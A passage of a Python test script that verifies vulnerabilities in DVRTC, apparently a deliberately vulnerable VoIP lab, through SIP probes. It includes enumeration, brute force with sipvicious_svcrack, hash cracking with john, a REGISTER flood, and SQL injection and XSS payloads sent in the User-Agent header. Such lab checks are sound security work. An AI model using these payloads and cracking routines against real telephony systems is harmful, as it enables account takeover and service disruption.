#!/usr/bin/env python3
"""DVRTC smoke and vulnerability checks.

This script is called directly by the testing container. Keep its CLI stable.
"""

from __future__ import annotations

import argparse
from collections.abc import Iterator, Sequence
from contextlib import closing, contextmanager
from dataclasses import dataclass
import hashlib
import ipaddress
import json
import os
from pathlib import Path
import random
import re
import socket
import ssl
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request
from typing import Callable


DEFAULT_SIP_PORT = 5060
HTTP_USER_AGENT = "dvrtc-checks/1.0"
SIP_STATUS_RE = re.compile(r"^SIP/2.0\s+(\d{3})")
DIGEST_PART_RE = re.compile(r'(\w+)=(".*?"|[^,]+)')


@dataclass(frozen=True)
class SipDialog:
    call_id: str
    from_tag: str
    branch: str

    @classmethod
    def create(cls) -> SipDialog:
        return cls(
            call_id=f"dvrtc-{random.randint(100000, 999999)}@checks.local",
            from_tag=f"chk-{random.randint(100000, 999999)}",
            branch=f"z9hG4bK-{random.randint(100000, 999999)}",
        )


@dataclass(frozen=True)
class SipResponse:
    code: int
    headers: dict[str, str]


@dataclass
class SipSession:
    host: str
    sockaddr: tuple
    sock: socket.socket
    local_ip: str
    local_port: int

    def send(self, payload: str) -> None:
        self.sock.sendto(payload.encode("utf-8"), self.sockaddr)

    def send_register(
        self,
        extension: str,
        user_agent: str,
        *,
        cseq: int,
        dialog: SipDialog | None = None,
        auth_header: tuple[str, str] | None = None,
        expires: int = 60,
        contact_star: bool = False,
    ) -> SipDialog:
        dialog = dialog or SipDialog.create()
        self.send(
            _build_register(
                self.host,
                extension,
                self.local_ip,
                self.local_port,
                user_agent,
                cseq=cseq,
                dialog=dialog,
                auth_header=auth_header,
                expires=expires,
                contact_star=contact_star,
            )
        )
        return dialog

    def send_options(
        self,
        extension: str,
        user_agent: str,
        *,
        dialog: SipDialog | None = None,
    ) -> SipDialog:
        dialog = dialog or SipDialog.create()
        self.send(
            _build_options(
                self.host,
                extension,
                self.local_ip,
                self.local_port,
                user_agent,
                dialog=dialog,
            )
        )
        return dialog

    def collect(
        self,
        response_window: float,
        *,
        stop_when: Callable[[SipResponse, Sequence[SipResponse]], bool] | None = None,
    ) -> list[SipResponse]:
        return _collect_sip_messages(
            self.sock,
            response_window,
            stop_when=stop_when,
        )


def _info(message: str) -> None:
    print(message, flush=True)


def _fail(message: str) -> int:
    print(f"[!] {message}", flush=True)
    return 1


def _normalize_host(host: str) -> str:
    if host.startswith("[") and host.endswith("]"):
        return host[1:-1]
    return host


def _is_ipv6_literal(host: str) -> bool:
    try:
        return ipaddress.ip_address(_normalize_host(host)).version == 6
    except ValueError:
        return False


def _format_uri_host(host: str) -> str:
    normalized = _normalize_host(host)
    if _is_ipv6_literal(normalized):
        return f"[{normalized}]"
    return normalized


def _format_hostport(host: str, port: int) -> str:
    return f"{_format_uri_host(host)}:{port}"


def _http_url(host: str, path: str) -> str:
    return f"http://{_format_uri_host(host)}{path}"


def _resolve_target(
    host: str,
    port: int,
    socktype: int,
    *,
    family: int = 0,
) -> tuple[int, int, int, tuple]:
    infos = socket.getaddrinfo(_normalize_host(host), port, family=family, type=socktype)
    if not infos:
        raise OSError(f"could not resolve {host}:{port}")
    addr_family, resolved_type, proto, _, sockaddr = infos[0]
    return addr_family, resolved_type, proto, sockaddr


def _bind_addr_for_family(family: int, port: int = 0) -> tuple:
    if family == socket.AF_INET6:
        return ("::", port, 0, 0)
    return ("0.0.0.0", port)


def _tcp_connect(host: str, port: int, timeout: float = 2.0) -> None:
    with socket.create_connection((_normalize_host(host), port), timeout=timeout):
        return


def _local_ip_for_target(host: str, port: int = DEFAULT_SIP_PORT) -> str:
    infos = socket.getaddrinfo(_normalize_host(host), port, type=socket.SOCK_DGRAM)
    if not infos:
        return "127.0.0.1"

    primary_family = infos[0][0]
    addr_family, _, proto, _, sockaddr = infos[0]
    with closing(socket.socket(addr_family, socket.SOCK_DGRAM, proto)) as probe:
        try:
            probe.connect(sockaddr)
            ip = probe.getsockname()[0]
            if ip and ip != "0.0.0.0":
                return ip
        except OSError:
            pass

    if primary_family == socket.AF_INET6:
        fallback_target = ("2606:4700::1", 80, 0, 0)
    else:
        fallback_target = ("8.8.8.8", 80)

    with closing(socket.socket(primary_family, socket.SOCK_DGRAM)) as probe:
        try:
            probe.connect(fallback_target)
            ip = probe.getsockname()[0]
            if ip:
                return ip
        except OSError:
            pass

    return "::1" if primary_family == socket.AF_INET6 else "127.0.0.1"


def _configured_rtp_host() -> str:
    for name in ("RTP_BLEED_HOST", "PUBLIC_IPV4"):
        candidate = _normalize_host(os.environ.get(name, "").strip())
        if not candidate:
            continue
        try:
            ip = ipaddress.ip_address(candidate)
        except ValueError:
            return candidate
        if ip.version == 4 and not ip.is_loopback:
            return candidate
    return ""


def _default_rtp_host(host: str) -> str:
    normalized = _normalize_host(host)
    if normalized.lower() == "localhost":
        configured = _configured_rtp_host()
        if configured:
            return configured
        return _local_ip_for_target("8.8.8.8", 80)

    try:
        ip = ipaddress.ip_address(normalized)
    except ValueError:
        return normalized

    if not ip.is_loopback:
        return normalized

    configured = _configured_rtp_host()
    if configured:
        return configured
    if ip.version == 6:
        return _local_ip_for_target("2606:4700::1", 80)
    return _local_ip_for_target("8.8.8.8", 80)


def _http_get_text(url: str, timeout: float = 5.0) -> tuple[int, str]:
    request = urllib.request.Request(url, headers={"User-Agent": HTTP_USER_AGENT})
    with urllib.request.urlopen(request, timeout=timeout) as response:
        body = response.read().decode("utf-8", errors="replace")
        return response.getcode(), body


def _build_register(
    target_host: str,
    extension: str,
    local_ip: str,
    local_port: int,
    user_agent: str,
    *,
    cseq: int,
    dialog: SipDialog,
    auth_header: tuple[str, str] | None = None,
    transport: str = "UDP",
    expires: int = 60,
    contact_star: bool = False,
) -> str:
    target_uri_host = _format_uri_host(target_host)
    local_hostport = _format_hostport(local_ip, local_port)
    contact = "*" if contact_star else f"<sip:{extension}@{local_hostport}>"
    lines = [
        f"REGISTER sip:{target_uri_host} SIP/2.0",
        f"Via: SIP/2.0/{transport} {local_hostport};branch={dialog.branch};rport",
        "Max-Forwards: 70",
        f"To: <sip:{extension}@{target_uri_host}>",
        f"From: <sip:{extension}@{target_uri_host}>;tag={dialog.from_tag}",
        f"Call-ID: {dialog.call_id}",
        f"CSeq: {cseq} REGISTER",
        f"Contact: {contact}",
        f"Expires: {expires}",
        f"User-Agent: {user_agent}",
    ]
    if auth_header is not None:
        lines.append(f"{auth_header[0]}: {auth_header[1]}")
    lines.extend(["Content-Length: 0", "", ""])
    return "\r\n".join(lines)


def _build_options(
    target_host: str,
    extension: str,
    local_ip: str,
    local_port: int,
    user_agent: str,
    *,
    dialog: SipDialog,
) -> str:
    target_uri_host = _format_uri_host(target_host)
    local_hostport = _format_hostport(local_ip, local_port)
    lines = [
        f"OPTIONS sip:{extension}@{target_uri_host} SIP/2.0",
        f"Via: SIP/2.0/UDP {local_hostport};branch={dialog.branch};rport",
        "Max-Forwards: 70",
        f"To: <sip:{extension}@{target_uri_host}>",
        f"From: <sip:probe@{target_uri_host}>;tag={dialog.from_tag}",
        f"Call-ID: {dialog.call_id}",
        "CSeq: 1 OPTIONS",
        f"Contact: <sip:probe@{local_hostport}>",
        f"User-Agent: {user_agent}",
        "Content-Length: 0",
        "",
        "",
    ]
    return "\r\n".join(lines)


def _parse_sip_message(data: bytes) -> SipResponse:
    text = data.decode("utf-8", errors="ignore")
    lines = text.split("\r\n")
    first_line = lines[0] if lines else ""
    match = SIP_STATUS_RE.match(first_line)
    code = int(match.group(1)) if match else 0

    headers: dict[str, str] = {}
    for line in lines[1:]:
        if not line:
            break
        if ":" not in line:
            continue
        key, value = line.split(":", 1)
        headers[key.strip().lower()] = value.strip()

    return SipResponse(code=code, headers=headers)


def _collect_sip_messages(
    sock: socket.socket,
    response_window: float,
    *,
    stop_when: Callable[[SipResponse, Sequence[SipResponse]], bool] | None = None,
) -> list[SipResponse]:
    messages: list[SipResponse] = []
    sock.settimeout(0.2)
    deadline = time.time() + response_window
    while time.time() < deadline:
        try:
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            continue
        response = _parse_sip_message(data)
        if response.code:
            messages.append(response)
            if stop_when is not None and stop_when(response, messages):
                break
    return messages


@contextmanager
def _open_sip_session(
    host: str,
    port: int = DEFAULT_SIP_PORT,
    *,
    local_port: int | None = None,
) -> Iterator[SipSession]:
    addr_family, socktype, proto, sockaddr = _resolve_target(host, port, socket.SOCK_DGRAM)
    with closing(socket.socket(addr_family, socktype, proto)) as sock:
        bind_addr = _bind_addr_for_family(addr_family)
        if local_port is not None:
            if addr_family == socket.AF_INET6:
                bind_addr = (bind_addr[0], local_port, bind_addr[2], bind_addr[3])
            else:
                bind_addr = (bind_addr[0], local_port)
        sock.bind(bind_addr)
        bound_local_port = sock.getsockname()[1]
        yield SipSession(
            host=host,
            sockaddr=sockaddr,
            sock=sock,
            local_ip=_local_ip_for_target(host, port),
            local_port=bound_local_port,
        )


def _probe_register(
    host: str,
    extension: str,
    user_agent: str,
    response_window: float = 2.0,
) -> list[SipResponse]:
    with _open_sip_session(host) as session:
        session.send_register(extension, user_agent, cseq=1)
        return session.collect(response_window)


def _probe_options(
    host: str,
    extension: str,
    user_agent: str,
    response_window: float = 2.0,
) -> list[SipResponse]:
    with _open_sip_session(host) as session:
        session.send_options(extension, user_agent)
        return session.collect(response_window)


def _parse_digest_challenge(header_value: str) -> dict[str, str]:
    if header_value.lower().startswith("digest "):
        header_value = header_value[7:]
    parts: dict[str, str] = {}
    for key, value in DIGEST_PART_RE.findall(header_value):
        parts[key.lower()] = value.strip().strip('"')
    return parts


def _build_digest_authorization(
    method: str,
    uri: str,
    username: str,
    password: str,
    challenge: dict[str, str],
) -> str:
    realm = challenge.get("realm")
    nonce = challenge.get("nonce")
    if not realm or not nonce:
        raise ValueError("digest challenge missing realm or nonce")

    algorithm = challenge.get("algorithm", "MD5").upper()
    if algorithm != "MD5":
        raise ValueError(f"unsupported digest algorithm {algorithm}")

    qop = challenge.get("qop", "")
    if qop:
        qop = qop.split(",", 1)[0].strip()

    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode("utf-8")).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode("utf-8")).hexdigest()
    fields = [
        f'username="{username}"',
        f'realm="{realm}"',
        f'nonce="{nonce}"',
        f'uri="{uri}"',
        "algorithm=MD5",
    ]

    if qop:
        cnonce = f"{random.getrandbits(64):016x}"
        nc = "00000001"
        response = hashlib.md5(
            f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}".encode("utf-8")
        ).hexdigest()
        fields.extend(
            [
                f'response="{response}"',
                f'cnonce="{cnonce}"',
                f"nc={nc}",
                f"qop={qop}",
            ]
        )
    else:
        response = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode("utf-8")).hexdigest()
        fields.append(f'response="{response}"')

    opaque = challenge.get("opaque")
    if opaque:
        fields.append(f'opaque="{opaque}"')

    return "Digest " + ", ".join(fields)


def _extract_digest_challenge(
    responses: Sequence[SipResponse],
) -> tuple[str, dict[str, str]] | None:
    for response in responses:
        if response.code != 401:
            continue
        if "www-authenticate" in response.headers:
            return "Authorization", _parse_digest_challenge(
                response.headers["www-authenticate"]
            )
        if "proxy-authenticate" in response.headers:
            return "Proxy-Authorization", _parse_digest_challenge(
                response.headers["proxy-authenticate"]
            )
    return None


def _is_digest_challenge_response(
    response: SipResponse,
    _responses: Sequence[SipResponse],
) -> bool:
    return response.code == 401 and (
        "www-authenticate" in response.headers
        or "proxy-authenticate" in response.headers
    )


def _is_final_register_response(
    response: SipResponse,
    _responses: Sequence[SipResponse],
) -> bool:
    return response.code >= 200


def _probe_authenticated_register(
    host: str,
    username: str,
    password: str,
    response_window: float = 2.0,
    *,
    local_port: int | None = None,
    expires: int = 60,
    contact_star: bool = False,
) -> list[SipResponse]:
    with _open_sip_session(host, local_port=local_port) as session:
        dialog = session.send_register(
            username,
            "DVRTC-Weak-Cred",
            cseq=1,
            dialog=SipDialog.create(),
        )
        initial_responses = session.collect(
            response_window,
            stop_when=_is_digest_challenge_response,
        )
        challenge_info = _extract_digest_challenge(initial_responses)
        if challenge_info is None:
            raise RuntimeError("did not receive a digest authentication challenge")

        auth_header_name, challenge = challenge_info
        auth_value = _build_digest_authorization(
            "REGISTER",
            f"sip:{_format_uri_host(host)}",
            username,
            password,
            challenge,
        )
        session.send_register(
            username,
            "DVRTC-Weak-Cred",
            cseq=2,
            dialog=dialog,
            auth_header=(auth_header_name, auth_value),
            expires=expires,
            contact_star=contact_star,
        )
        return session.collect(
            response_window,
            stop_when=_is_final_register_response,
        )


def _poll_useragents_for_token(host: str, token: str, timeout: float = 15.0) -> bool:
    url = _http_url(host, "/logs/useragents/useragents.json")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            status_code, body = _http_get_text(url, timeout=3.0)
            if status_code == 200:
                data = json.loads(body)
                if isinstance(data, list):
                    for item in data:
                        if isinstance(item, dict) and token in str(item.get("useragent", "")):
                            return True
        except (json.JSONDecodeError, urllib.error.URLError, TimeoutError):
            pass
        time.sleep(0.8)
    return False


def _sip_codes(responses: Sequence[SipResponse]) -> list[int]:
    return [response.code for response in responses]


def _run_capture(command: Sequence[str], timeout: float) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        list(command),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=timeout,
        check=False,
    )


def _print_if_present(output: str) -> None:
    if output:
        print(output, end="")


def _recv_tcp_sip_data(sock: socket.socket, timeout: float = 3.0) -> bytes:
    """Read SIP response data from a TCP socket."""
    sock.settimeout(timeout)
    chunks: list[bytes] = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
            if b"\r\n\r\n" in b"".join(chunks):
                break
    except socket.timeout:
        pass
    return b"".join(chunks)


def _probe_register_tcp(
    host: str,
    port: int,
    extension: str,
    user_agent: str,
    *,
    transport_name: str = "TCP",
    ssl_ctx: ssl.SSLContext | None = None,
) -> list[SipResponse]:
    """Send a REGISTER over TCP (or TLS) and return parsed responses."""
    normalized = _normalize_host(host)
    local_ip = _local_ip_for_target(host, port)
    raw_sock = socket.create_connection((normalized, port), timeout=5.0)
    try:
        sock: socket.socket = raw_sock
        if ssl_ctx is not None:
            sock = ssl_ctx.wrap_socket(raw_sock, server_hostname=normalized)
        local_port = sock.getsockname()[1]
        dialog = SipDialog.create()
        msg = _build_register(
            host, extension, local_ip, local_port, user_agent,
            cseq=1, dialog=dialog, transport=transport_name,
        )
        sock.sendall(msg.encode("utf-8"))
        data = _recv_tcp_sip_data(sock)
    finally:
        raw_sock.close()
    if not data:
        return []
    return [_parse_sip_message(data)]


def _probe_register_ws(
    host: str,
    port: int,
    extension: str,
    user_agent: str,
    *,
    secure: bool = False,
) -> list[SipResponse]:
    """Send a REGISTER over WebSocket and return parsed responses."""
    from websockets.sync.client import connect as ws_connect

    scheme = "wss" if secure else "ws"
    formatted_host = _format_uri_host(host)
    uri = f"{scheme}://{formatted_host}:{port}"

    ssl_ctx = None
    if secure:
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    local_ip = _local_ip_for_target(host, port)
    dialog = SipDialog.create()
    msg = _build_register(
        host, extension, local_ip, 0, user_agent,
        cseq=1, dialog=dialog, transport="WS",
    )
    with ws_connect(
        uri,
        subprotocols=["sip"],
        ssl_context=ssl_ctx,
        open_timeout=5,
        additional_headers={"Host": f"{formatted_host}:{port}"},
    ) as conn:
        conn.send(msg)
        try:
            response_data = conn.recv(timeout=3)
        except TimeoutError:
            return []
    if not response_data:
        return []
    raw = response_data.encode("utf-8") if isinstance(response_data, str) else response_data
    return [_parse_sip_message(raw)]


def _run_kamcmd(kamcmd_addr: str, *args: str) -> str:
    """Run kamcmd with the given arguments and return stdout."""
    cmd = ["kamcmd", "-s", kamcmd_addr] + list(args)
    result = subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=10.0,
        check=False,
    )
    return result.stdout or ""


def _run_for_duration(command: Sequence[str], duration: float) -> str:
    """Run a command for a fixed duration, then terminate and return output."""
    proc = subprocess.Popen(
        list(command),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    try:
        stdout, _ = proc.communicate(timeout=duration)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            stdout, _ = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, _ = proc.communicate(timeout=5)
    return stdout or ""


def _run_baresip_session(
    account_line: str,
    *,
    duration: float = 15.0,
    extra_config: str = "",
    dial_uri: str = "",
) -> str:
    """Run baresip with a temporary config for a duration and return output."""
    with tempfile.TemporaryDirectory(prefix="dvrtc-baresip-") as tmpdir:
        Path(tmpdir, "accounts").write_text(
            account_line + "\n", encoding="utf-8",
        )
        config_lines = [
            "module_path\t\t/usr/lib/baresip/modules",
            "audio_player\t\taubridge,loopback",
            "audio_source\t\taubridge,loopback",
            "audio_alert\t\taubridge,loopback",
            "video_source",
            "video_display",
            "audio_codecs\t\tPCMU/8000/1,PCMA/8000/1",
            "module\t\t\tmenu.so",
            "module\t\t\taccount.so",
            "module\t\t\tg711.so",
            "module\t\t\taubridge.so",
            "module\t\t\tuuid.so",
        ]
        if extra_config:
            config_lines.append(extra_config)
        Path(tmpdir, "config").write_text(
            "\n".join(config_lines) + "\n", encoding="utf-8",
        )
        Path(tmpdir, "contacts").write_text("", encoding="utf-8")

        cmd = ["baresip", "-f", tmpdir, "-v"]
        if dial_uri:
            cmd.extend(["-e", f"d {dial_uri}"])
        cmd.extend(["-t", str(int(duration))])
        return _run_for_duration(cmd, duration + 10)


def cmd_smoke(args: argparse.Namespace) -> int:
    _info("[*] Smoke: checking TCP reachability")
    for port in (80, DEFAULT_SIP_PORT, 3478, args.mysql_port):
        try:
            _tcp_connect(args.host, port, timeout=2.0)
        except OSError as exc:
            return _fail(f"TCP connect failed for {args.host}:{port} ({exc})")
        _info(f"    [+] TCP {args.host}:{port} reachable")

    _info("[*] Smoke: checking HTTP root")
    try:
        status_code, body = _http_get_text(_http_url(args.host, "/"), timeout=5.0)
    except urllib.error.URLError as exc:
        return _fail(f"HTTP root check failed ({exc})")
    if status_code != 200 or "DVRTC" not in body:
        return _fail("HTTP root check did not return expected DVRTC page")
    _info("    [+] HTTP root looks correct")

    _info("[*] Smoke: checking user-agent JSON endpoint")
    try:
        status_code, body = _http_get_text(
            _http_url(args.host, "/logs/useragents/useragents.json"),
            timeout=5.0,
        )
        if status_code != 200:
            return _fail(f"useragents.json returned HTTP {status_code}")
        json.loads(body)
    except (urllib.error.URLError, json.JSONDecodeError) as exc:
        return _fail(f"useragents.json check failed ({exc})")
    _info("    [+] useragents.json is reachable and valid JSON")

    _info("[*] Smoke: checking basic SIP response")
    responses = _probe_register(args.host, args.extension, "DVRTC-Smoke")
    codes = _sip_codes(responses)
    if not codes:
        return _fail("No SIP response received for smoke REGISTER probe")
    _info(f"    [+] SIP response codes observed: {sorted(set(codes))}")
    _info("[+] Smoke checks passed")
    return 0


def cmd_enum(args: argparse.Namespace) -> int:
    _info("[*] Enumeration check via direct SIP OPTIONS probe")
    responses = _probe_options(args.host, args.extension, "DVRTC-Enum")
    codes = _sip_codes(responses)
    if not codes:
        return _fail("Enumeration check failed: no SIP response received")
    _info(f"    [+] SIP response codes observed: {sorted(set(codes))}")
    if all(code in {404, 484, 604} for code in codes):
        return _fail(f"Enumeration check failed: extension {args.extension} appears absent")
    _info(f"[+] SIP enumeration confirmed for extension {args.extension}")
    return 0


def cmd_weak_cred(args: argparse.Namespace) -> int:
    try:
        responses = _probe_authenticated_register(
            args.host,
            args.username,
            args.password,
            args.timeout,
        )
    except RuntimeError as exc:
        return _fail(f"Weak credential check failed ({exc})")

    codes = _sip_codes(responses)
    if not codes:
        return _fail("Weak credential check failed: no SIP response after authenticated REGISTER")
    _info(f"    [+] SIP response codes observed: {sorted(set(codes))}")
    if 200 not in codes:
        return _fail("Weak credential check failed: authenticated REGISTER did not succeed")
    _info("[+] Weak credential vulnerability confirmed")
    return 0


def _parse_svcrack_hits(output: str) -> list[tuple[str, str]]:
    hits: list[tuple[str, str]] = []
    for extension, password in re.findall(r"\|\s*([^\|\s]+)\s*\|\s*([^\|\s]+)\s*\|", output):
        if extension.lower() == "extension" and password.lower() == "password":
            continue
        hits.append((extension, password))
    return hits


def cmd_weak_cred_svcrack(args: argparse.Namespace) -> int:
    extension = args.extension or args.username
    target = f"udp://{_format_hostport(args.host, args.port)}"
    command = [
        "sipvicious_svcrack",
        "-u",
        args.username,
        "-e",
        extension,
        "-r",
        args.password_range,
        "--maximumtime",
        str(int(max(1, args.timeout))),
    ]
    if args.zeropadding:
        command.extend(["-z", str(args.zeropadding)])
    if args.reuse_nonce:
        command.append("-n")
    command.append(target)

    _info(
        f"[*] Weak credential brute-force check via sipvicious_svcrack "
        f"against {target} ({args.password_range})"
    )
    try:
        result = _run_capture(command, args.timeout)
    except FileNotFoundError:
        return _fail("sipvicious_svcrack is not installed in this environment")
    except subprocess.TimeoutExpired as exc:
        _print_if_present(exc.stdout or "")
        return _fail(f"Weak credential svcrack check timed out after {args.timeout} seconds")

    output = result.stdout or ""
    _print_if_present(output)
    hits = _parse_svcrack_hits(output)
    if not hits:
        return _fail("Weak credential svcrack check failed: no credentials recovered")

    if args.expected_password:
        for hit_extension, hit_password in hits:
            if hit_extension == extension and hit_password == args.expected_password:
                _info(
                    f"[+] Weak credential vulnerability confirmed via sipvicious_svcrack "
                    f"({extension}:{hit_password})"
                )
                return 0
        return _fail(
            f"Weak credential svcrack check failed: expected password "
            f"'{args.expected_password}' was not recovered"
        )

    hit_extension, hit_password = hits[0]
    _info(
        f"[+] Weak credential vulnerability confirmed via sipvicious_svcrack "
        f"({hit_extension}:{hit_password})"
    )
    return 0


def _run_log_injection_check(
    host: str,
    extension: str,
    token: str,
    payload: str,
    label: str,
    timeout: float,
) -> int:
    _info(f"[*] {label} check: sending malicious User-Agent payload")
    responses = _probe_register(host, extension, payload)
    codes = _sip_codes(responses)
    if not codes:
        return _fail(f"{label} check failed: no SIP response to REGISTER injection probe")
    _info(f"    [*] SIP response codes observed: {sorted(set(codes))}")

    _info(f"[*] {label} check: polling logs JSON for payload token")
    if not _poll_useragents_for_token(host, token, timeout=timeout):
        return _fail(f"{label} token not found in useragents.json")
    _info(f"[+] {label} vulnerability confirmed (token {token} observed)")
    return 0


def cmd_sqli(args: argparse.Namespace) -> int:
    token = f"DVRTC_SQLI_{random.randint(100000, 999999)}"
    payload = f"leak'), ((SELECT '{token}'))-- "
    return _run_log_injection_check(
        args.host,
        args.extension,
        token,
        payload,
        "SQLi",
        args.timeout,
    )


def cmd_xss(args: argparse.Namespace) -> int:
    token = f"DVRTC_XSS_{random.randint(100000, 999999)}"
    payload = f'<img src=x onerror=alert("{token}")>'
    return _run_log_injection_check(
        args.host,
        args.extension,
        token,
        payload,
        "XSS",
        args.timeout,
    )


def cmd_sip_flood(args: argparse.Namespace) -> int:
    _info(
        f"[*] SIP flood check: sending {args.requests} REGISTER requests to "
        f"{_format_hostport(args.host, DEFAULT_SIP_PORT)}"
    )
    with _open_sip_session(args.host) as session:
        for cseq in range(1, args.requests + 1):
            session.send_register(
                args.extension,
                user_agent=f"DVRTC-SIP-FLOOD-{cseq}",
                cseq=cseq,
            )

        responses = session.collect(args.collect_seconds)

    response_count = len(responses)
    code_counts: dict[int, int] = {}
    for response in responses:
        code_counts[response.code] = code_counts.get(response.code, 0) + 1

    _info(f"    [*] Collected {response_count} SIP responses")
    _info(f"    [*] Response breakdown: {code_counts if code_counts else '{}'}")

    if 503 in code_counts:
        return _fail("Observed SIP 503 responses during flood check (rate limiting active)")
    if response_count < args.min_responses:
        return _fail(
            f"Too few SIP responses during flood check ({response_count} < {args.min_responses})"
        )
    _info("[+] SIP flood susceptibility confirmed (no 503 throttling observed)")
    return 0


def _is_john_sip_hash(hash_line: str) -> bool:
    parts = hash_line.split("*")
    return len(parts) == 15 and parts[0] == "$sip$"


def cmd_offline_crack(args: argparse.Namespace) -> int:
    raw_hash_line = args.hash_line.strip()
    if not raw_hash_line.startswith("$sip$"):
        return _fail("Offline crack check requires a SIP hash line starting with '$sip$'")
    if not _is_john_sip_hash(raw_hash_line):
        return _fail("Offline crack check requires a john SIP hash")
    hash_line = raw_hash_line

    candidates: list[str] = []
    if args.expected_password:
        candidates.append(args.expected_password)
    for item in args.candidates.split(","):
        candidate = item.strip()
        if candidate and candidate not in candidates:
            candidates.append(candidate)
    if not candidates:
        return _fail("Offline crack check requires at least one candidate password")

    try:
        format_result = _run_capture(["john", "--list=formats"], max(10.0, args.timeout))
    except FileNotFoundError:
        return _fail("john is not installed in the testing image")
    except subprocess.TimeoutExpired:
        return _fail("john format listing timed out")

    if re.search(r"\bSIP\b", format_result.stdout or "") is None:
        return _fail("john build does not include SIP digest format support")

    with tempfile.TemporaryDirectory(prefix="dvrtc-john-") as temp_dir:
        hash_path = Path(temp_dir) / "sip.hash"
        wordlist_path = Path(temp_dir) / "wordlist.txt"
        hash_path.write_text(hash_line + "\n", encoding="utf-8")
        wordlist_path.write_text("\n".join(candidates) + "\n", encoding="utf-8")

        _info("[*] Offline crack check: running john with SIP format and a short candidate list")
        try:
            crack_result = _run_capture(
                [
                    "john",
                    "--format=SIP",
                    f"--wordlist={wordlist_path}",
                    f"--max-run-time={args.max_run_time}",
                    str(hash_path),
                ],
                args.timeout,
            )
        except subprocess.TimeoutExpired as exc:
            _print_if_present(exc.stdout or "")
            return _fail(f"Offline crack timed out after {args.timeout} seconds")

        _print_if_present(crack_result.stdout or "")

        try:
            show_result = _run_capture(
                ["john", "--show", "--format=SIP", str(hash_path)],
                max(10.0, args.timeout),
            )
        except subprocess.TimeoutExpired as exc:
            _print_if_present(exc.stdout or "")
            return _fail("john --show timed out during offline crack check")

        show_output = show_result.stdout or ""
        _print_if_present(show_output)

    if args.expected_password and args.expected_password in show_output:
        _info(
            f"[+] Offline SIP digest cracking confirmed "
            f"(password '{args.expected_password}' recovered)"
        )
        return 0

    if re.search(r"\b1 password hash cracked\b", show_output, re.IGNORECASE):
        _info("[+] Offline SIP digest cracking confirmed")
        return 0

    return _fail("Offline crack check failed (john did not crack the SIP hash)")


def cmd_rtp_bleed(args: argparse.Namespace) -> int:
    script_path = Path(__file__).with_name("rtpbleed.py")
    if not script_path.exists():
        return _fail(f"RTP bleed check helper not found at {script_path}")

    rtp_host = args.rtp_host or _default_rtp_host(args.host)
    timeout = max(args.duration + args.listen + 5.0, 10.0)

    _info(f"[*] RTP bleed check: probing {_format_hostport(rtp_host, args.start_port)}-{args.end_port}")
    for attempt in range(1, args.attempts + 1):
        _info(f"    [*] Attempt {attempt}/{args.attempts}")
        try:
            result = _run_capture(
                [
                    sys.executable,
                    str(script_path),
                    rtp_host,
                    str(args.start_port),
                    str(args.end_port),
                    "--duration",
                    str(args.duration),
                    "--probes",
                    str(args.probes),
                    "--cycle-listen",
                    str(args.cycle_listen),
                    "--listen",
                    str(args.listen),
                    "--payload-type",
                    str(args.payload_type),
                    "--first",
                ],
                timeout,
            )
        except subprocess.TimeoutExpired as exc:
            _print_if_present(exc.stdout or "")
            return _fail(
                f"RTP bleed check timed out after {timeout:.1f} seconds on attempt {attempt}"
            )

        _print_if_present(result.stdout or "")
        if result.returncode == 0:
            _info(f"[+] RTP bleed vulnerability confirmed via {rtp_host}")
            return 0

    return _fail(f"RTP bleed check failed after {args.attempts} attempts against {rtp_host}")


def cmd_register(args: argparse.Namespace) -> int:
    _info(f"[*] Register: authenticating as {args.username}")
    try:
        responses = _probe_authenticated_register(
            args.host, args.username, args.password, args.timeout,
            local_port=args.local_port,
        )
    except RuntimeError as exc:
        return _fail(f"Register check failed ({exc})")

    codes = _sip_codes(responses)
    if 200 not in codes:
        return _fail(f"Register check failed: no 200 OK (codes: {sorted(set(codes))})")
    _info("    [+] Registration succeeded (200 OK)")

    if args.register_only:
        _info("[+] Register check passed")
        return 0

    _info("[*] Register: sending unregister (Expires: 0, Contact: *)")
    try:
        unreg_responses = _probe_authenticated_register(
            args.host, args.username, args.password, args.timeout,
            local_port=args.local_port,
            expires=0, contact_star=True,
        )
    except RuntimeError as exc:
        return _fail(f"Unregister failed ({exc})")

    unreg_codes = _sip_codes(unreg_responses)
    if 200 not in unreg_codes:
        return _fail(f"Unregister failed: no 200 OK (codes: {sorted(set(unreg_codes))})")
    _info("    [+] Unregistration succeeded (200 OK)")
    _info("[+] Register/unregister check passed")
    return 0


def cmd_bad_auth(args: argparse.Namespace) -> int:
    _info("[*] Bad-auth: attempting registration with wrong password")
    try:
        responses = _probe_authenticated_register(
            args.host, args.username, "wrongpass_dvrtc", args.timeout,
        )
    except RuntimeError:
        _info("    [+] Server did not provide an auth challenge (expected for some configs)")
        _info("[+] Bad-auth check passed")
        return 0

    codes = _sip_codes(responses)
    if 200 in codes:
        return _fail("Bad-auth check failed: server accepted wrong password with 200 OK")
    _info(f"    [+] Server correctly rejected wrong password (codes: {sorted(set(codes))})")
    _info("[+] Bad-auth check passed")
    return 0


def cmd_sip_transport(args: argparse.Namespace) -> int:
    _info("[*] SIP transport check: testing all SIP transports")
    results: dict[str, bool] = {}

    _info("    [*] Testing UDP/5060")
    udp_responses = _probe_register(args.host, args.extension, "DVRTC-Transport-UDP")
    udp_codes = _sip_codes(udp_responses)
    results["UDP"] = bool(udp_codes)
    _info(f"        {'[+]' if udp_codes else '[!]'} UDP: {sorted(set(udp_codes)) if udp_codes else 'no response'}")

